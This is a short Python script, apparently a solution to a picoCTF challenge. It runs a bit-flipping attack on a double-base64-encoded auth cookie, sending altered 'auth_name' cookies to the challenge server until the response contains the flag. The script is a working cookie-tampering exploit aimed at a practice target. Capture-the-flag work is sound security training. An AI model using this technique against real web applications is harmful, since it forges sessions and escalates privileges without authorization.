from base64 import b64decode
from base64 import b64encode
import requests

auth = "K0VEbmhTZ2RDZjZiVGNlcVZjZ0JQamdqVHN3dXFBWVpYSWVRcXcxTXc3a2pRVlJWTnlzeTFDK1RjUnNlN3gvc1E1b3hoNVpkYnprS0c3Q1lYVGpHY1l4Q3gyMnlQZ2xVdkZBL21mUlArWWV0UkNiNXNPZFd0em45TXhza3R1cSs="

def bitFlip(pos, bit, data):
    raw = bytearray(b64decode(b64decode(data).decode()))
    raw[pos] = raw[pos] ^ bit
    raw = bytes(raw)
    return b64encode(b64encode(raw)).decode()




for i in range(96):
    for j in range(96):
        print("position:{},bit={}".format(i, j))
        c = bitFlip(i, j, auth)
        cookies = {'auth_name': c}
        r = requests.get('http://mercury.picoctf.net:10868/', cookies=cookies)
        if "picoCTF{" in r.text:
            print(r.text)
            break